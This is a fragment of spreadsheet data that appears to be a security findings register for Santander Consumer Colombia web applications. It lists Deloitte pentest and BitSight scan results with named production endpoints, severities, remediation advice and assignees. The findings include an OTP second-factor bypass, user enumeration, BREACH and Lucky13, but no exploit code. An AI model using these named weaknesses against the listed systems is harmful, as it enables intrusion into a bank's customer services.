    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la aplicación y/o framework  de programación utilizada para sustentar a la propia aplicación, así como versión. Esta  información podría ser utilizada por un atacante con el objetivo de recabar información para  ataques futuros. _x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta  del servidor o en alguna página de error o por defecto del aplicativo_x000a__x000a_Durante las pruebas realizadas se ha comprobado que las páginas por defecto revelan _x000a_información interna acerca del software/framework y versión de este, utilizado para _x000a_desarrollar la aplicación a través de la dirección URL _x000a_“/lib/bootstrap/dist/js/bootstrap.bundle.min.js” y “/lib/jquery_x0002_validation/dist/jquery.validate.min.js”._x000a_"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al _x000a_software/framework y versión utilizada para desarrollar la propia aplicación. Para ello es _x000a_necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error _x000a_que divulguen este tipo de información."/>
    <s v="Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo _x000a_permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las _x000a_mismas, así como generar ataques más elaborados contra la plataforma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="303"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SCO-25-CNMPA-015-AP-005"/>
    <x v="123"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-05T00:00:00"/>
    <n v="230"/>
    <d v="2026-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de  tipo &quot;gzip&quot; o &quot;DEFLATE&quot;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
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una _x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite _x000a_una mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de _x000a_rendimiento en las solicitudes afectadas. _x000a_A continuación, se muestra cómo se deshabilita la compresión HTTP para Apache y NGINX: _x000a_Deshabilitar compresión en Apache: _x000a_●Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_ $ sudo a2dismod deflate _x000a_●Reinicie el servidor: _x000a_ $ sudo /etc/init.d/apache2 restart _x000a_Deshabilitar compresión en NGINX: _x000a_●Establezca la configuración del host con la opción gzip en off: _x000a_ server { _x000a_ server_name www.example.com; _x000a_ listen 443 ssl http2; _x000a_ gzip off; _x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el _x000a_navegador del cliente y el servidor, y tener acceso a la información transmitida entre ambos a _x000a_través del canal de comunicaciones (datos personales, credenciales de usuario, identificadores _x000a_de sesión, etc.)."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="304"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-69089b91da6d35412ab5c11c"/>
    <s v="SCO-25-CNMPO-014-AP-001"/>
    <x v="15"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance/account/v1/account/_x000a_Public_Santander_Production/account"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-02-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo o servicio permite conocer la existencia de nombres de usuario en el sistema. Este _x000a_comportamiento se puede producir de dos maneras distintas: _x000a_•El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario _x000a_es un usuario válido en el sistema o aplicación afectada. _x000a_•El aplicativo o servicio permite recuperar o acceder al listado de los usuarios dados de alta de _x000a_manera total o parcial"/>
    <s v="Se recomienda que el aplicativo no permita proporcionar un listado de usuarios presentes en el _x000a_sistema a roles que no sean administrativos. Así mismo, se recomienda que el mecanismo de _x000a_autenticación no proporcione evidencias que permitan discernir si el usuario introducido está dado _x000a_de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de _x000a_respuesta de la aplicación. Siendo un mensaje genérico de acceso incorrecto la mejor opción en _x000a_estos casos."/>
    <s v="Esta vulnerabilidad podría ser utilizada por un atacante para intentar obtener un listado de los _x000a_usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar _x000a_ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de _x000a_contraseñas, ataques de phishing, ataques de fuerza bruta o &quot;password spraying&quot; sobre las _x000a_contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna _x000a_cuenta de usuario o administrador."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="305"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-69089c85da6d35412ab5c11e"/>
    <s v="SCO-25-CNMPO-014-AP-002"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.4000000000000004"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-02-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para sustentar a la propia aplicación, más concretamente, indicando el tipo de servidor y su versión. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros. _x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al tipo de servidor _x000a_y versión utilizado para alojar la propia aplicación. Para ello es necesario eliminar las cabeceras de _x000a_respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información."/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a _x000a_un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como _x000a_generar ataques más elaborados contra la plataforma."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="306"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-69089bd2da6d35412ab5c11d"/>
    <s v="SCO-25-CNMPO-014-AP-003"/>
    <x v="124"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.2"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance/otp/v1/otp/validate"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-02-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El uso de una clave de operaciones, o un segundo factor de autenticación, permite proteger ciertas operativas consideradas privilegiadas o críticas de un uso malintencionado por parte de un atacante que estuviera suplantando la identidad de un usuario legítimo de la aplicación. De esta manera, para realizar operaciones privilegiadas sería necesario conocer la clave de operaciones o el segundo factor de autenticación. La vulnerabilidad radica en que un atacante puede evadir el proceso de comprobación de la misma y realizar operaciones privilegiadas sin necesidad de conocer esta clave o 2FA."/>
    <s v="Como recomendación principal se debería sustituir el uso de una clave de operaciones por el uso _x000a_de un token tipo 2FA de un sólo uso. _x000a_En caso de no ser posible, a modo de medida compensatoria, se ha de verificar en el lado del servidor _x000a_que el usuario ha introducido la clave de operaciones o segundo factor de autenticación de manera _x000a_satisfactoria antes de proceder a realizar la operación privilegiada. _x000a_En caso que el usuario no introduzca la clave de operaciones, segundo factor de autenticación, o que _x000a_los haya introducido de manera errónea, se deberá generar un error y aumentar el contador de _x000a_intentos fallidos. Además, se recomienda bloquear la clave de operaciones cuando el contador de _x000a_intentos fallidos exceda de unos 3 intentos en un determinado espacio de tiempo."/>
    <s v="En caso de que el atacante consiga obtener acceso a la sesión de un usuario legítimo de la plataforma _x000a_(por ejemplo mediante el robo de un identificador de sesión, usurpación de claves, uso de un equipo _x000a_compartido) un atacante puede evadir el proceso de firma de la operación y realizar operaciones _x000a_privilegiadas sin conocer la clave de operaciones o segundo factor de autenticación."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="307"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <m/>
    <s v="SCO-25-CNMPO-014-AP-004"/>
    <x v="38"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante. Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante."/>
    <s v="Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no _x000a_se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor _x000a_afectado para que utilice un servidor DNS interno o de la DMZ."/>
    <s v="Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició _x000a_la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, _x000a_un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del _x000a_mismo. _x000a_Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como _x000a_proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos _x000a_vía DNS. En ambos casos la dirección del Servidor DNS del atacante permanece oculta y se mostraría _x000a_la dirección IP del servidor afectado como originaria del ataque."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="308"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <m/>
    <s v="SCO-25-CNMPO-014-AP-005"/>
    <x v="34"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad &quot;BREACH&quot; es una instancia del ataque CRIME contra la compresión HTTP de tipo &quot;gzip&quot; o &quot;DEFLATE&quot; a través de la opción de la codificación de contenido dentro de HTTP. Este ataque se centra en la realización de una búsqueda inicial de fuerza bruta para averiguar unos pocos bytes, seguido por una búsqueda de divide-y-vencerás para expandir un acierto a una gran cantidad de contenido arbitraria."/>
    <s v="COMENDACIÓN_x000a_Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una _x000a_petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una _x000a_mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de _x000a_rendimiento en las solicitudes afectadas. _x000a_A continuación, se muestra como se deshabilita la compresión HTTP para Apache y NGINX: _x000a_Deshabilitar compresión en Apache: _x000a_●Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_ $ sudo a2dismod deflate _x000a_●Reinicie el servidor: _x000a_ $ sudo /etc/init.d/apache2 restart _x000a_Deshabilitar compresión en NGINX: _x000a_●Establezca la configuración del host con la opción gzip en off: _x000a_ server { _x000a_ server_name www.example.com; _x000a_ listen 443 ssl http2; _x000a_ gzip off; _x000a_ }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre el navegador _x000a_del cliente y el servidor, y tener acceso a la información transmitida entre ambos a través del canal _x000a_de comunicaciones (datos personales, credenciales de usuario, identificadores de sesión, etc.)."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="309"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <m/>
    <s v="SCO-25-CNMPO-014-AP-006"/>
    <x v="125"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://simplefinance.santanderfinancing.co_x000a_m:4443/SimpleFinance"/>
    <m/>
    <m/>
    <d v="2025-11-06T00:00:00"/>
    <n v="229"/>
    <d v="2026-03-06T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por una _x000a_vulnerabilidad conocida como Lucky13. _x000a_Según se ha podido determinar el servidor utiliza cifrados CBC sobre TLS, lo que permitiría a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque conocido como Padding de Oracle (POODLE). _x000a_Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block_x0002_Chaining) son potencialmente vulnerables a este tipo ataques. _x000a_CVEs Asociados: _x000a_•CVE-2013-0169"/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y _x000a_eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar _x000a_todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen _x000a_corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la _x000a_vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien _x000a_descargando la última versión del siguiente enlace: _x000a_•https://www.openssl.org/source"/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK, _x000a_PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación _x000a_MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar _x000a_ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de _x000a_los datos de tiempo de los paquetes transmitidos."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="310"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="126"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-11T00:00:00"/>
    <n v="255"/>
    <d v="2026-02-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Potentially insecure policy; Ineffective headers: Content-Security-Policy; Missing required headers"/>
    <s v="(Potentially insecure policy) This Content-Security-Policy (CSP) has issues that possibly makes it insecure. - Remove any instances of &quot;unsafe-&quot; directives and &quot;blob, data, filesystem&quot; sources. Ensure your CSP directives are correctly configured. Learn more at W3C CSP.| (Ineffective headers: Content-Security-Policy) The implementation of these header(s) do not follow security best practices. - Ensure your headers are implemented correctly, as outlined in RFC-7231. Your headers should not permit caching of encrypted content. They should also have specific permissions (as opposed to using wildcards or other generalizations) and be formatted properly.| (Missing required headers) One or more required security headers are not set. - Ensure your policy correctly implements the required headers. Refer to the list of required headers."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="311"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <n v="0"/>
    <m/>
    <x v="127"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-07T00:00:00"/>
    <n v="259"/>
    <d v="2026-02-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="An insecure CSP configuration was detected."/>
    <s v="(An insecure CSP configuration was detected.) The Content Security Policy is not effective at meeting the security objectives defined for preventing Cross Site Scripting attacks, such as:_x000a__x000a_Preventing loading of unauthorized content resources and scripts._x000a_Preventing clickjacking and other nested frame attacks._x000a_Ensuring that web forms and links are behaving as intended._x000a_ - To improve your configuration, make sure to:_x000a__x000a_Implement directives that set valid and complete source restrictions for loading dynamic content ('script-src', 'object-src', 'default-src')._x000a_Avoid the use of unsafe directives such as ‘unsafe-eval’ and ‘unsafe-inline’._x000a_Avoid typos or otherwise invalid CSP directives._x000a_Avoid wildcards, host-based allowlists, or bare URL schemes such as ‘HTTP’ in source directives._x000a_Use specific sources, such as &quot;https://www.example.com&quot;. Remove generalizations, such as &quot;http:&quot;, &quot;https:&quot;, &quot;https://*.com&quot;.See Content Security Policy Configurations for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="312"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="128"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-11T00:00:00"/>
    <n v="224"/>
    <d v="2026-03-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Missing integrity attribute"/>
    <s v="(Missing integrity attribute) The page does not include an integrity attribute on cross-domain fetching of scripts. - Avoid loading scripts from third-party resources to prevent exposure to content and JavaScript manipulation by third parties or in case of a network compromise. If third-party script loading is unavoidable, subresource integrity tags should be used whenever possible.See Cross-Domain Subresource Integrity Check for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="313"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="129"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-11-11T00:00:00"/>
    <n v="224"/>
    <d v="2026-02-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Resource blocked by Content Security Policy (CSP)"/>
    <s v="(Resource blocked by Content Security Policy (CSP)) The page attempted to load a resource that was blocked by the CSP policy. The presence of such error suggests that:_x000d__x000a__x000d__x000a_The website content and security policies are incongruent._x000d__x000a_The website unknowingly includes third-party content._x000d__x000a_Malicious code is injected into the website but blocked by the CSP._x000d__x000a_ - Review the website for CSP violation messages. Detailed information about the existing violations is available in the evidence details section and you may be able to find them on your browser of choice, on developer tools, under the Console tab. See Content Security Policy Violations for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="314"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="130"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-10T00:00:00"/>
    <n v="256"/>
    <d v="2026-02-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Potentially insecure policy; Ineffective headers: Content-Security-Policy; Missing required headers"/>
    <s v="(Potentially insecure policy) This Content-Security-Policy (CSP) has issues that possibly makes it insecure. - Remove any instances of &quot;unsafe-&quot; directives and &quot;blob, data, filesystem&quot; sources. Ensure your CSP directives are correctly configured. Learn more at W3C CSP.| (Ineffective headers: Content-Security-Policy) The implementation of these header(s) do not follow security best practices. - Ensure your headers are implemented correctly, as outlined in RFC-7231. Your headers should not permit caching of encrypted content. They should also have specific permissions (as opposed to using wildcards or other generalizations) and be formatted properly.| (Missing required headers) One or more required security headers are not set. - Ensure your policy correctly implements the required headers. Refer to the list of required headers."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="315"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="127"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-30T00:00:00"/>
    <n v="236"/>
    <d v="2026-02-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="An insecure CSP configuration was detected."/>
    <s v="(An insecure CSP configuration was detected.) The Content Security Policy is not effective at meeting the security objectives defined for preventing Cross Site Scripting attacks, such as:_x000a__x000a_Preventing loading of unauthorized content resources and scripts._x000a_Preventing clickjacking and other nested frame attacks._x000a_Ensuring that web forms and links are behaving as intended._x000a_ - To improve your configuration, make sure to:_x000a__x000a_Implement directives that set valid and complete source restrictions for loading dynamic content ('script-src', 'object-src', 'default-src')._x000a_Avoid the use of unsafe directives such as ‘unsafe-eval’ and ‘unsafe-inline’._x000a_Avoid typos or otherwise invalid CSP directives._x000a_Avoid wildcards, host-based allowlists, or bare URL schemes such as ‘HTTP’ in source directives._x000a_Use specific sources, such as &quot;https://www.example.com&quot;. Remove generalizations, such as &quot;http:&quot;, &quot;https:&quot;, &quot;https://*.com&quot;.See Content Security Policy Configurations for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="316"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="128"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-30T00:00:00"/>
    <n v="236"/>
    <d v="2026-02-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Missing integrity attribute"/>
    <s v="(Missing integrity attribute) The page does not include an integrity attribute on cross-domain fetching of scripts. - Avoid loading scripts from third-party resources to prevent exposure to content and JavaScript manipulation by third parties or in case of a network compromise. If third-party script loading is unavoidable, subresource integrity tags should be used whenever possible.See Cross-Domain Subresource Integrity Check for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="317"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="129"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2025-10-30T00:00:00"/>
    <n v="236"/>
    <d v="2026-01-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Resource blocked by Content Security Policy (CSP)"/>
    <s v="(Resource blocked by Content Security Policy (CSP)) The page attempted to load a resource that was blocked by the CSP policy. The presence of such error suggests that:_x000d__x000a__x000d__x000a_The website content and security policies are incongruent._x000d__x000a_The website unknowingly includes third-party content._x000d__x000a_Malicious code is injected into the website but blocked by the CSP._x000d__x000a_ - Review the website for CSP violation messages. Detailed information about the existing violations is available in the evidence details section and you may be able to find them on your browser of choice, on developer tools, under the Console tab. See Content Security Policy Violations for more information."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="318"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderconsumer"/>
    <m/>
    <m/>
    <x v="96"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-09-17T00:00:00"/>
    <n v="644"/>
    <d v="2024-12-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Public key size is less than 2048 bits"/>
    <s v="(Public key size is less than 2048 bits) Keys shorter than 2048 bits may be insecure. - Use OpenSSL or SSL implementation of your choice to generate a new keypair, and specify 2048 bits or greater of key strength at generation. Implement the stronger keypair into your DKIM configuration."/>
    <m/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="319"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Notificaciones"/>
    <s v="MAN-69a7f18d76713a70a18d56ca"/>
    <s v="SCO-26-CNMPO-001-AP-001"/>
    <x v="131"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v=" https://notificaciones.api.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de un correcto control de captura y gestión de los errores producidos en la aplicación presenta múltiples problemas de seguridad. La problemática más común suele ser la revelación de información interna en mensajes de error, tales como volcados de pila con información del motivo del error, información interna de la base de datos, información específica de la tecnología utilizada, etc."/>
    <s v="Se recomienda que la aplicación devuelva errores genéricos independientemente de la causa que haya producido el error."/>
    <s v="Con estos datos revelados en los errores un atacante puede obtener información interna de la aplicación o de las tecnologías utilizadas para sustentar la aplicación. De esta manera, el atacante dispondrá de más información para poder realizar ataques especialmente dirigidos con una mayor probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Cesar Augusto Puentes"/>
  </r>
  <r>
    <n v="320"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Notificaciones"/>
    <s v="MAN-69a7f22f76713a70a18d56cb"/>
    <s v="SCO-26-CNMPO-001-AP-002"/>
    <x v="132"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v=" https://notificaciones.api.santander.com.co"/>
    <m/>
    <m/>
    <d v="2026-03-04T00:00:00"/>
    <n v="111"/>
    <d v="2026-06-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La inyección de HTML es un tipo de vulnerabilidad de inyección, que se produce cuando un usuario puede controlar un punto de entrada e inyectar código HTML arbitrario en una página web vulnerable."/>
    <s v="Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos. Existen dos estrategias generales para implantar este filtro: • Filtrado de lista blanca: Se valida la información recibida en función de la información esperada. • Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “”, “)”, “(“, “”” y la cadena “script”. De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras. Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities: • (&quot;) sería &quot; • (') sería &amp;apos • () sería &gt;"/>
